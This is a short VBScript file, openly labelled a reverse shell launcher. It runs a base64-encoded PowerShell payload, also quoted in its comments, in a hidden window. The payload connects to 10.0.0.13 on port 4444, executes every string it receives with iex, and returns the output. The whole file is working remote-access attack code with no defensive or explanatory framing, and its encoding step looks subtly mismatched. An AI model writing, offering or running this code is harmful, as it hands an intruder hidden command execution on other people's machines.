' VBScript reverse shell launcher - invokes a base64'd PowerShell TCPClient payload
' Decoded payload:
'   $c=New-Object Net.Sockets.TCPClient('10.0.0.13',4444);$s=$c.GetStream();
'   [byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){
'     $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
'     $r=(iex $d 2>&1|Out-String);$rb=([text.encoding]::ASCII).GetBytes($r);
'     $s.Write($rb,0,$rb.Length);$s.Flush()};$c.Close()
Dim sh, b64, cmd
b64 = "JGM9TmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjAuMC4xMycsNDQ0NCk7JHM9JGMuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYj0wLi42NTUzNXwleyAwfTt3aGlsZSgoJGk9JHMuUmVhZCgkYiwwLCRiLkxlbmd0aCkpIC1uZSAwKXskZD0oTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5nKCRiLDAsJGkpOyRyPShpZXggJGQgMj4mMXxPdXQtU3RyaW5nKTskcmI9KFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRyKTskcy5Xcml0ZSgkcmIsMCwkcmIuTGVuZ3RoKTskcy5GbHVzaCgpfTskYy5DbG9zZSgp"
cmd = "powershell.exe -nop -w hidden -enc " & b64
Set sh = CreateObject("WScript.Shell")
sh.Run cmd, 0, False
